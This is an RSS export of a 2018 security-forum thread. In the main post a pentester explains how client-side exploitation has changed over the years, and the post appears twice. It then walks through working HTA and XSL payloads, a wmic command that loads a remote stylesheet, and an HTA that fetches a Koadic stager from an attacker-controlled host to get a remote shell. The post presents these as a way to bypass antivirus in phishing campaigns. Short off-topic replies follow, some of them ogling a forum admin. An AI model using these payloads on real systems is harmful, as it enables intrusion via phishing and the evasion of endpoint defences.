<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Clientside Exploitation in 2018 - How Pentesting Has Changed</title>
    <link>https://0x00sec.org/t/clientside-exploitation-in-2018-how-pentesting-has-changed/7356</link>
    <description># Exploitation in 2018 - How Pentesting Has Changed

Hi 0x00sec! This is the next installment of my pentesting series. If you missed my last two articles, you can read the first one [here](https://0x00sec.org/t/osint-passive-recon-and-discovery-of-assets/6715) and the second one [here](https://0x00sec.org/t/osint-0x02-linkedin-is-not-just-for-jobs/6774). They are heavily OSINT focussed, and naturally, the next article should be about active recon, however, I move in erratic ways and such the next installment is about exploitation, and specifically, how the field has changed up until now. 

Please note, I am not an expert in pentesting history, this is purely my understanding of it and has been sourced from speaking with fellow infosec professionals and my experience. 

## The History

### New, Old School Pentesting
Back in the old days (post 90&#39;s, yes, I&#39;m young), pentesting was as easy as doing a port scan, finding a host, and then running a script against it as soon as you were able to download the module from exploit-db or similar. People who did this in the early 2000&#39;s were able to pass as pentesters, and be proficient at it, systems were rampant with insecurities, and so getting in (generally speaking), was a straightforward feat. You also had a lot of security consulting businesses charging as little as $500 for a &quot;pentest&quot;, which damaged the name of penetration testing, especially when they later got hit by more advanced threats.

### The wave of SQLi and AppSec
Then, people starting getting a little smarter, and pentesters began utilizing things like SQL Injection, XSS and other web application related security, this was nicely supplemented by the release of [sqlmap](https://github.com/sqlmapproject/sqlmap/wiki/History), allowing virtually anybody to exploit blind SQL Injection vulnerabilities. Around this period, SQL Injection actually was at the top of the [OWASP Top 10](https://www.owasp.org/index.php/Top_10_2010-Main), and after being exploited a wide array of times, it easily became one of the worlds most well-known application vulnerabilities. Containerisation was not really a thing, and infrastructure was still widely deployed by hand.

Breaking into a website was as easy as putting quotation marks on the end of the URL. 

### Pics.exe
Around this time, spam emails began to circulate using cheap ploys such as attaching an executable file masquerading as a picture or a zip file. It was common to get spam emails containing something along the lines of &quot;See this funny picture of a cat!&quot;, cat-pics.jpg.exe. Anti-virus and anti-spam were badly trained, and so getting an individual to run your exploit was quite straightforward. 

##### Encoding
As a side venture from this, encoding and packers became a popular thing, such as the renowned `shikata ga nai` encoding that came bundled with msfpayload and msfencode (which soon became msfvenom). 
##### Custom RAT era
Soon, these began to be detected easily as well, anti-virus and anti-spam were getting smarter, scanning executables and beating encoding, no longer could you just generate a metasploit payload and encode it. Now you had to make your own RAT/shell, this was a hugely productive era as Windows would run a custom compiled C++ without a hitch, and email allowed for attachment of such things without a problem. 

### The Powershell Craze
Eventually, though, custom rats and encoding began to fail, antivirus got smarter, and non-signed executables started to get blocked automatically in some environments; especially in businesses. In recent years, though, (2016-2017) Powershell has become the powerhouse of pentesters looking to phish for shells. Powershell has emerged as one of the biggest clientside tools, manifesting itself in things like [Empire](https://github.com/EmpireProject/Empire). Powershell was really great too, until recently..

### HTA and XSL, JScript and VBS
Microsoft released [AMSI](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf), which is bad news for pentesters phishing with PowerShell. No longer does sending a javascript/hta file loading PowerShell works. AMSI picks this stuff up immediately. 

Luckily though, the cat and mouse game has reached a new level, and this time the mouse is winning. And this time it&#39;s with HTA&#39;s, XSL, and [Koadic](https://github.com/zerosum0x0/koadic), and at the time of writing, this method works very very well. The main difference is that koadic uses JScript, which isn&#39;t (yet) detected by AMSI in the same way PowerShell is. 

## The meat...
https://twitter.com/pry0cc/status/1011351481461739520

If you follow me on twitter, then you&#39;ll have seen my tweet showcasing the (not new), yet creative method of linking HTA with XSL. If you don&#39;t follow me on twitter, go do that now, I&#39;m @pry0cc, https://twitter.com/pry0cc (shameless plug). 

If you&#39;ve been out of the loop, I&#39;ll explain to you what HTA is, what XSL is, and how it works. 

If you&#39;re really behind as well, you&#39;ll be clueless about sharpshooter, and absolutely stellar tool for automatically generating HTA&#39;s. If you&#39;re interested in using sharpshooter, check out [this](https://www.mdsec.co.uk/2018/03/payload-generation-using-sharpshooter/) and then [this](https://www.mdsec.co.uk/2018/06/freestyling-with-sharpshooter-v1-0/). Also, I&#39;ll give you fair warning, RUN SHARPSHOOTER WITH PYTHON2. It&#39;ll run with python3, but it&#39;ll fail.

Now that I&#39;ve saved all you fellow Arch users 10 hours of struggle, let&#39;s go through how I pop shells with HTA and XSL.

### HTA
Hold up pry0cc, what are HTA&#39;s? 

HTA&#39;s are short for HTML Applications. And they&#39;re basically a way to run a HTML app in a popout view, and are treated similar to an actual application, except they&#39;re written in HTML. They&#39;re handled by the `mshta.exe` application. One thing that is really cool about HTA&#39;s, is their ability to execute vbscript, which means you can execute commands. 

Also, HTA files are opened when you double click them. 

`payload.hta`
```html
&lt;script language=&quot;VBScript&quot;&gt;
        set objShell = CreateObject(&quot;Wscript.Shell&quot;)
        objShell.run &quot;calc.exe&quot;
        self.close
&lt;/script&gt;

``` 

Here&#39;s an example of a HTA file, that will work, right now, on Windows 10. The code here should be fairly self-explanatory, using VBScript it creates a `Wscript.Shell` object, and causes it to run calc.exe. Place this on any web server, and clicking this will cause it to download, and will run when you click `run`.

### XSL
Now this is good, but it doesn&#39;t mean squat unless we can pop a shell, right? Well. Kind of. Luckily, we don&#39;t have to answer that because we can! And we can do it with XSL&#39;s. 

XSL, aka XLST, is a [Microsoft Stylesheet Script Format](https://docs.microsoft.com/en-us/dotnet/standard/data/xml/xslt-stylesheet-scripting-using-msxsl-script). These payloads also contain the ability to run Microsoft scripting languages. 

`payload.xsl`
```xml
&lt;?xml version=&#39;1.0&#39;?&gt;
&lt;stylesheet
xmlns=&quot;http://www.w3.org/1999/XSL/Transform&quot; xmlns:ms=&quot;urn:schemas-microsoft-com:xslt&quot;
xmlns:user=&quot;placeholder&quot;
version=&quot;1.0&quot;&gt;
&lt;output method=&quot;text&quot;/&gt;
	&lt;ms:script implements-prefix=&quot;user&quot; language=&quot;JScript&quot;&gt;
	&lt;![CDATA[
	var r = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;calc.exe&quot;);
	]]&gt; &lt;/ms:script&gt;
&lt;/stylesheet&gt;
``` 

What is really cool with XSL files, is that you can load it in the windows command line remotely, with [WMI](https://en.wikipedia.org/wiki/Windows_Management_Instrumentation). To test this, start a python handler locally with `python -m http.server`, and discover the url, and then run in a windows command prompt:
```bash
wmic os get /FORMAT:&quot;http://url-to/payload.xsl&quot;
```
This should pop a Calculator. What is cool about this, is that there is a tool that generates obfuscated XSL files, and allows you to get shells with it!

### Koadic
I&#39;ve spoken briefly about Koadic already, so I won&#39;t go into it too much, especially when [the github](https://github.com/zerosum0x0/koadic) page does such a good job.

![enter image description here](//0x00sec.s3.dualstack.us-east-1.amazonaws.com/original/2X/5/5f5d0bdcf36c9e70da29acfb226bf9862546d0cb.png)

Generate a stager using `use stager/js/wmic`, and provided you have the port specified open, you&#39;ll be able to run this wmic command to run this xsl file. One really cool attack we can do is chain this with HTA&#39;s, to execute wmi. 

Watch out though, we need to escape out the double quotes. Hold up, you can&#39;t just put \ behind it, like a normal language, oh no, Microsoft had the audacity to decide that the escaping character was going to be &quot;....

payload-2.hta
```html
&lt;script language=&quot;VBScript&quot;&gt;
        set objShell = CreateObject(&quot;Wscript.Shell&quot;)
        objShell.run &quot;wmic os get /FORMAT:&quot;&quot;http://your-ip:9996/YjL41.xsl&quot;&quot;&quot;
        self.close
&lt;/script&gt;
``` 

It&#39;s nothing pretty, but send this to your target, click run, boom. 
![enter image description here](//0x00sec.s3.dualstack.us-east-1.amazonaws.com/original/2X/e/e8fffd350eea9b14985a71351b7fc2434867d56c.png)
![enter image description here](//0x00sec.s3.dualstack.us-east-1.amazonaws.com/original/2X/1/1487548c53951800083ea6b5b36d353710d8ccac.png)

Now you have a shell, to do with, whatever you please! ;)

### Conclusion
Pentesting has come a long way, developing your own RAT&#39;s is really not very practical anymore, except of course unless you have WMI or HTA launchers for them. Now that we have a method for bypassing AV, we can look to creating a phishing campaign with [gophish](https://hub.docker.com/r/matteoggl/gophish/). In the majority of businesses, pentesters resort to using phishing as it is a very good source of shells, with a very high percentage rate. 

If you liked this article, please like it and share it wherever you can. Tweet me at [@pry0cc](https://twitter.com/pry0cc), or drop a comment saying if you loved, or hated it, and please tell me if I made a mistake and I&#39;l be sure to correct it!

### Whats next:
That part is up to you.

[quote]I want to know how to do:[/quote]
[poll type=regular]
* Advanced HTA attacks with Demiguise
* Phishing Framework Setup with GoPhish
* Phishing Proxy Setup with Judas
* Domain Flyovers with Aquatone
* Something else (comment!)
[/poll]</description>
    
    <lastBuildDate>Sun, 01 Jul 2018 21:09:57 +0000</lastBuildDate>
    <category>Malware</category>
    <atom:link href="https://0x00sec.org/t/clientside-exploitation-in-2018-how-pentesting-has-changed/7356.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>Clientside Exploitation in 2018 - How Pentesting Has Changed</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            <p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
          <p><a href="https://0x00sec.org/t/clientside-exploitation-in-2018-how-pentesting-has-changed/7356/8">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/clientside-exploitation-in-2018-how-pentesting-has-changed/7356/8</link>
        <pubDate>Tue, 31 Jul 2018 20:26:52 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-7356-8</guid>
        <source url="https://0x00sec.org/t/clientside-exploitation-in-2018-how-pentesting-has-changed/7356.rss">Clientside Exploitation in 2018 - How Pentesting Has Changed</source>
      </item>
      <item>
        <title>Clientside Exploitation in 2018 - How Pentesting Has Changed</title>
        <dc:creator><![CDATA[nugget]]></dc:creator>
        <description><![CDATA[
            <p>Could see its source code, but she is real I know it I have seen her delicate hand on webcam</p>
          <p><a href="https://0x00sec.org/t/clientside-exploitation-in-2018-how-pentesting-has-changed/7356/7">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/clientside-exploitation-in-2018-how-pentesting-has-changed/7356/7</link>
        <pubDate>Sun, 01 Jul 2018 21:09:57 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-7356-7</guid>
        <source url="https://0x00sec.org/t/clientside-exploitation-in-2018-how-pentesting-has-changed/7356.rss">Clientside Exploitation in 2018 - How Pentesting Has Changed</source>
      </item>
      <item>
        <title>Clientside Exploitation in 2018 - How Pentesting Has Changed</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            <p>I’m not a genie. Also, I don’t think it’s possible to “see” a markov chains bot.</p>
          <p><a href="https://0x00sec.org/t/clientside-exploitation-in-2018-how-pentesting-has-changed/7356/6">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/clientside-exploitation-in-2018-how-pentesting-has-changed/7356/6</link>
        <pubDate>Sun, 01 Jul 2018 21:08:43 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-7356-6</guid>
        <source url="https://0x00sec.org/t/clientside-exploitation-in-2018-how-pentesting-has-changed/7356.rss">Clientside Exploitation in 2018 - How Pentesting Has Changed</source>
      </item>
      <item>
        <title>Clientside Exploitation in 2018 - How Pentesting Has Changed</title>
        <dc:creator><![CDATA[nugget]]></dc:creator>
        <description><![CDATA[
            <p>One of the admins (IRC) side for this network, she is apparently quite beautiful; I am just curious</p>
          <p><a href="https://0x00sec.org/t/clientside-exploitation-in-2018-how-pentesting-has-changed/7356/5">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/clientside-exploitation-in-2018-how-pentesting-has-changed/7356/5</link>
        <pubDate>Sun, 01 Jul 2018 21:07:25 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-7356-5</guid>
        <source url="https://0x00sec.org/t/clientside-exploitation-in-2018-how-pentesting-has-changed/7356.rss">Clientside Exploitation in 2018 - How Pentesting Has Changed</source>
      </item>
      <item>
        <title>Clientside Exploitation in 2018 - How Pentesting Has Changed</title>
        <dc:creator><![CDATA[dtm]]></dc:creator>
        <description><![CDATA[
            <p>Who is this “suser” person? I’ve never seen them around on this forum before.</p>
          <p><a href="https://0x00sec.org/t/clientside-exploitation-in-2018-how-pentesting-has-changed/7356/4">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/clientside-exploitation-in-2018-how-pentesting-has-changed/7356/4</link>
        <pubDate>Sun, 01 Jul 2018 21:05:48 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-7356-4</guid>
        <source url="https://0x00sec.org/t/clientside-exploitation-in-2018-how-pentesting-has-changed/7356.rss">Clientside Exploitation in 2018 - How Pentesting Has Changed</source>
      </item>
      <item>
        <title>Clientside Exploitation in 2018 - How Pentesting Has Changed</title>
        <dc:creator><![CDATA[nugget]]></dc:creator>
        <description><![CDATA[
            <p>I want to know what suser looks like</p>
          <p><a href="https://0x00sec.org/t/clientside-exploitation-in-2018-how-pentesting-has-changed/7356/3">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/clientside-exploitation-in-2018-how-pentesting-has-changed/7356/3</link>
        <pubDate>Sun, 01 Jul 2018 20:36:45 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-7356-3</guid>
        <source url="https://0x00sec.org/t/clientside-exploitation-in-2018-how-pentesting-has-changed/7356.rss">Clientside Exploitation in 2018 - How Pentesting Has Changed</source>
      </item>
      <item>
        <title>Clientside Exploitation in 2018 - How Pentesting Has Changed</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            <p>PS. This is not to say that you can not get in externally via just the network. You can definitely. In some very protected networks however, this method seems to work as a good fallback.</p>
          <p><a href="https://0x00sec.org/t/clientside-exploitation-in-2018-how-pentesting-has-changed/7356/2">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/clientside-exploitation-in-2018-how-pentesting-has-changed/7356/2</link>
        <pubDate>Sun, 01 Jul 2018 20:30:58 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-7356-2</guid>
        <source url="https://0x00sec.org/t/clientside-exploitation-in-2018-how-pentesting-has-changed/7356.rss">Clientside Exploitation in 2018 - How Pentesting Has Changed</source>
      </item>
      <item>
        <title>Clientside Exploitation in 2018 - How Pentesting Has Changed</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            <h1>Exploitation in 2018 - How Pentesting Has Changed</h1>
<p>Hi 0x00sec! This is the next installment of my pentesting series. If you missed my last two articles, you can read the first one <a href="https://0x00sec.org/t/osint-passive-recon-and-discovery-of-assets/6715">here</a> and the second one <a href="https://0x00sec.org/t/osint-0x02-linkedin-is-not-just-for-jobs/6774">here</a>. They are heavily OSINT focussed, and naturally, the next article should be about active recon, however, I move in erratic ways and such the next installment is about exploitation, and specifically, how the field has changed up until now.</p>
<p>Please note, I am not an expert in pentesting history, this is purely my understanding of it and has been sourced from speaking with fellow infosec professionals and my experience.</p>
<h2>The History</h2>
<h3>New, Old School Pentesting</h3>
<p>Back in the old days (post 90’s, yes, I’m young), pentesting was as easy as doing a port scan, finding a host, and then running a script against it as soon as you were able to download the module from exploit-db or similar. People who did this in the early 2000’s were able to pass as pentesters, and be proficient at it, systems were rampant with insecurities, and so getting in (generally speaking), was a straightforward feat. You also had a lot of security consulting businesses charging as little as $500 for a “pentest”, which damaged the name of penetration testing, especially when they later got hit by more advanced threats.</p>
<h3>The wave of SQLi and AppSec</h3>
<p>Then, people starting getting a little smarter, and pentesters began utilizing things like SQL Injection, XSS and other web application related security, this was nicely supplemented by the release of <a href="https://github.com/sqlmapproject/sqlmap/wiki/History">sqlmap</a>, allowing virtually anybody to exploit blind SQL Injection vulnerabilities. Around this period, SQL Injection actually was at the top of the <a href="https://www.owasp.org/index.php/Top_10_2010-Main">OWASP Top 10</a>, and after being exploited a wide array of times, it easily became one of the worlds most well-known application vulnerabilities. Containerisation was not really a thing, and infrastructure was still widely deployed by hand.</p>
<p>Breaking into a website was as easy as putting quotation marks on the end of the URL.</p>
<h3>Pics.exe</h3>
<p>Around this time, spam emails began to circulate using cheap ploys such as attaching an executable file masquerading as a picture or a zip file. It was common to get spam emails containing something along the lines of “See this funny picture of a cat!”, cat-pics.jpg.exe. Anti-virus and anti-spam were badly trained, and so getting an individual to run your exploit was quite straightforward.</p>
<h5>Encoding</h5>
<p>As a side venture from this, encoding and packers became a popular thing, such as the renowned <code>shikata ga nai</code> encoding that came bundled with msfpayload and msfencode (which soon became msfvenom).</p>
<h5>Custom RAT era</h5>
<p>Soon, these began to be detected easily as well, anti-virus and anti-spam were getting smarter, scanning executables and beating encoding, no longer could you just generate a metasploit payload and encode it. Now you had to make your own RAT/shell, this was a hugely productive era as Windows would run a custom compiled C++ without a hitch, and email allowed for attachment of such things without a problem.</p>
<h3>The Powershell Craze</h3>
<p>Eventually, though, custom rats and encoding began to fail, antivirus got smarter, and non-signed executables started to get blocked automatically in some environments; especially in businesses. In recent years, though, (2016-2017) Powershell has become the powerhouse of pentesters looking to phish for shells. Powershell has emerged as one of the biggest clientside tools, manifesting itself in things like <a href="https://github.com/EmpireProject/Empire">Empire</a>. Powershell was really great too, until recently…</p>
<h3>HTA and XSL, JScript and VBS</h3>
<p>Microsoft released <a href="https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf">AMSI</a>, which is bad news for pentesters phishing with PowerShell. No longer does sending a javascript/hta file loading PowerShell works. AMSI picks this stuff up immediately.</p>
<p>Luckily though, the cat and mouse game has reached a new level, and this time the mouse is winning. And this time it’s with HTA’s, XSL, and <a href="https://github.com/zerosum0x0/koadic">Koadic</a>, and at the time of writing, this method works very very well. The main difference is that koadic uses JScript, which isn’t (yet) detected by AMSI in the same way PowerShell is.</p>
<h2>The meat…</h2>
<aside class="onebox twitterstatus">
  <header class="source">
      <a href="https://twitter.com/pry0cc/status/1011351481461739520" target="_blank" rel="noopener">twitter.com</a>
  </header>
  <article class="onebox-body">
    <img src="/uploads/default/original/2X/0/093ff14a4e259b59af628128fca8a87ee783e967.jpeg" class="thumbnail onebox-avatar" width="400" height="400">

<h4><a href="https://twitter.com/pry0cc/status/1011351481461739520" target="_blank" rel="noopener">pry - Ben Bidmead (pry0cc)</a></h4>

<div class="tweet"> Bypassing AV with demiguise HTA and WMI XSL.

This works so beautifully!
 <a href="https://twitter.com/HackingDave" target="_blank" rel="noopener">@HackingDave</a> <a href="https://twitter.com/FuzzyNop" target="_blank" rel="noopener">@FuzzyNop</a> <a href="https://twitter.com/mubix" target="_blank" rel="noopener">@mubix</a> <a href="https://t.co/yxLxEVe5jZ" target="_blank" rel="noopener">https://t.co/yxLxEVe5jZ</a><div class="tweet-images">
  <div class="aspect-image-full-size" style="--aspect-ratio:1280/680;">
    <video class="tweet-video" controls="" playsinline="" width="695" height="369" poster="https://pbs.twimg.com/ext_tw_video_thumb/1011350746351226882/pu/img/tfn5niq8MnT5Uak6.jpg">
      <source src="https://video.twimg.com/ext_tw_video/1011350746351226882/pu/vid/338x180/fPv0_dqfvrcj0scV.mp4?tag=3" type="video/mp4">
    </video>
  </div>
</div>
</div>

<div class="date">
  <a href="https://twitter.com/pry0cc/status/1011351481461739520" target="_blank" rel="noopener">8:52 PM - 25 Jun 2018</a>
    <span class="like">
      <svg viewBox="0 0 512 512" width="14px" height="16px" aria-hidden="true">
        <path d="M462.3 62.6C407.5 15.9 326 24.3 275.7 76.2L256 96.5l-19.7-20.3C186.1 24.3 104.5 15.9 49.7 62.6c-62.8 53.6-66.1 149.8-9.9 207.9l193.5 199.8c12.5 12.9 32.8 12.9 45.3 0l193.5-199.8c56.3-58.1 53-154.3-9.8-207.9z"></path>
      </svg> 29
    </span>
    <span class="retweet">
      <svg viewBox="0 0 640 512" width="14px" height="16px" aria-hidden="true">
        <path d="M629.657 343.598L528.971 444.284c-9.373 9.372-24.568 9.372-33.941 0L394.343 343.598c-9.373-9.373-9.373-24.569 0-33.941l10.823-10.823c9.562-9.562 25.133-9.34 34.419.492L480 342.118V160H292.451a24.005 24.005 0 0 1-16.971-7.029l-16-16C244.361 121.851 255.069 96 276.451 96H520c13.255 0 24 10.745 24 24v222.118l40.416-42.792c9.285-9.831 24.856-10.054 34.419-.492l10.823 10.823c9.372 9.372 9.372 24.569-.001 33.941zm-265.138 15.431A23.999 23.999 0 0 0 347.548 352H160V169.881l40.416 42.792c9.286 9.831 24.856 10.054 34.419.491l10.822-10.822c9.373-9.373 9.373-24.569 0-33.941L144.971 67.716c-9.373-9.373-24.569-9.373-33.941 0L10.343 168.402c-9.373 9.373-9.373 24.569 0 33.941l10.822 10.822c9.562 9.562 25.133 9.34 34.419-.491L96 169.881V392c0 13.255 10.745 24 24 24h243.549c21.382 0 32.09-25.851 16.971-40.971l-16.001-16z"></path>
      </svg> 22
    </span>
</div>

  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<p>If you follow me on twitter, then you’ll have seen my tweet showcasing the (not new), yet creative method of linking HTA with XSL. If you don’t follow me on twitter, go do that now, I’m <a class="mention" href="https://0x00sec.org/u/pry0cc">@pry0cc</a>, <a href="https://twitter.com/pry0cc">https://twitter.com/pry0cc</a> (shameless plug).</p>
<p>If you’ve been out of the loop, I’ll explain to you what HTA is, what XSL is, and how it works.</p>
<p>If you’re really behind as well, you’ll be clueless about sharpshooter, and absolutely stellar tool for automatically generating HTA’s. If you’re interested in using sharpshooter, check out <a href="https://www.mdsec.co.uk/2018/03/payload-generation-using-sharpshooter/">this</a> and then <a href="https://www.mdsec.co.uk/2018/06/freestyling-with-sharpshooter-v1-0/">this</a>. Also, I’ll give you fair warning, RUN SHARPSHOOTER WITH PYTHON2. It’ll run with python3, but it’ll fail.</p>
<p>Now that I’ve saved all you fellow Arch users 10 hours of struggle, let’s go through how I pop shells with HTA and XSL.</p>
<h3>HTA</h3>
<p>Hold up pry0cc, what are HTA’s?</p>
<p>HTA’s are short for HTML Applications. And they’re basically a way to run a HTML app in a popout view, and are treated similar to an actual application, except they’re written in HTML. They’re handled by the <code>mshta.exe</code> application. One thing that is really cool about HTA’s, is their ability to execute vbscript, which means you can execute commands.</p>
<p>Also, HTA files are opened when you double click them.</p>
<p><code>payload.hta</code></p>
<pre><code class="lang-auto">&lt;script language="VBScript"&gt;
        set objShell = CreateObject("Wscript.Shell")
        objShell.run "calc.exe"
        self.close
&lt;/script&gt;

</code></pre>
<p>Here’s an example of a HTA file, that will work, right now, on Windows 10. The code here should be fairly self-explanatory, using VBScript it creates a <code>Wscript.Shell</code> object, and causes it to run calc.exe. Place this on any web server, and clicking this will cause it to download, and will run when you click <code>run</code>.</p>
<h3>XSL</h3>
<p>Now this is good, but it doesn’t mean squat unless we can pop a shell, right? Well. Kind of. Luckily, we don’t have to answer that because we can! And we can do it with XSL’s.</p>
<p>XSL, aka XLST, is a <a href="https://docs.microsoft.com/en-us/dotnet/standard/data/xml/xslt-stylesheet-scripting-using-msxsl-script">Microsoft Stylesheet Script Format</a>. These payloads also contain the ability to run Microsoft scripting languages.</p>
<p><code>payload.xsl</code></p>
<pre><code class="lang-xml">&lt;?xml version='1.0'?&gt;
&lt;stylesheet
xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
xmlns:user="placeholder"
version="1.0"&gt;
&lt;output method="text"/&gt;
	&lt;ms:script implements-prefix="user" language="JScript"&gt;
	&lt;![CDATA[
	var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
	]]&gt; &lt;/ms:script&gt;
&lt;/stylesheet&gt;
</code></pre>
<p>What is really cool with XSL files, is that you can load it in the windows command line remotely, with <a href="https://en.wikipedia.org/wiki/Windows_Management_Instrumentation">WMI</a>. To test this, start a python handler locally with <code>python -m http.server</code>, and discover the url, and then run in a windows command prompt:</p>
<pre><code class="lang-bash">wmic os get /FORMAT:"http://url-to/payload.xsl"
</code></pre>
<p>This should pop a Calculator. What is cool about this, is that there is a tool that generates obfuscated XSL files, and allows you to get shells with it!</p>
<h3>Koadic</h3>
<p>I’ve spoken briefly about Koadic already, so I won’t go into it too much, especially when <a href="https://github.com/zerosum0x0/koadic">the github</a> page does such a good job.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/5/5f5d0bdcf36c9e70da29acfb226bf9862546d0cb.png" alt="enter image description here" width="" height=""></p>
<p>Generate a stager using <code>use stager/js/wmic</code>, and provided you have the port specified open, you’ll be able to run this wmic command to run this xsl file. One really cool attack we can do is chain this with HTA’s, to execute wmi.</p>
<p>Watch out though, we need to escape out the double quotes. Hold up, you can’t just put \ behind it, like a normal language, oh no, Microsoft had the audacity to decide that the escaping character was going to be "…</p>
<p>payload-2.hta</p>
<pre><code class="lang-auto">&lt;script language="VBScript"&gt;
        set objShell = CreateObject("Wscript.Shell")
        objShell.run "wmic os get /FORMAT:""http://your-ip:9996/YjL41.xsl"""
        self.close
&lt;/script&gt;
</code></pre>
<p>It’s nothing pretty, but send this to your target, click run, boom.<br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/e/e8fffd350eea9b14985a71351b7fc2434867d56c.png" alt="enter image description here" width="" height=""><br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/1/1487548c53951800083ea6b5b36d353710d8ccac.png" alt="enter image description here" width="" height=""></p>
<p>Now you have a shell, to do with, whatever you please! <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:"></p>
<h3>Conclusion</h3>
<p>Pentesting has come a long way, developing your own RAT’s is really not very practical anymore, except of course unless you have WMI or HTA launchers for them. Now that we have a method for bypassing AV, we can look to creating a phishing campaign with <a href="https://hub.docker.com/r/matteoggl/gophish/">gophish</a>. In the majority of businesses, pentesters resort to using phishing as it is a very good source of shells, with a very high percentage rate.</p>
<p>If you liked this article, please like it and share it wherever you can. Tweet me at <a href="https://twitter.com/pry0cc">@pry0cc</a>, or drop a comment saying if you loved, or hated it, and please tell me if I made a mistake and I’l be sure to correct it!</p>
<h3>Whats next:</h3>
<p>That part is up to you.</p>
<aside class="quote no-group">
<blockquote>
<p>I want to know how to do:</p>
</blockquote>
</aside>
<p><a href="https://0x00sec.org/t/clientside-exploitation-in-2018-how-pentesting-has-changed/7356/1">Click to view the poll.</a></p>
          <p><a href="https://0x00sec.org/t/clientside-exploitation-in-2018-how-pentesting-has-changed/7356/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/clientside-exploitation-in-2018-how-pentesting-has-changed/7356/1</link>
        <pubDate>Sun, 01 Jul 2018 20:26:51 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-7356-1</guid>
        <source url="https://0x00sec.org/t/clientside-exploitation-in-2018-how-pentesting-has-changed/7356.rss">Clientside Exploitation in 2018 - How Pentesting Has Changed</source>
      </item>
  </channel>
</rss>
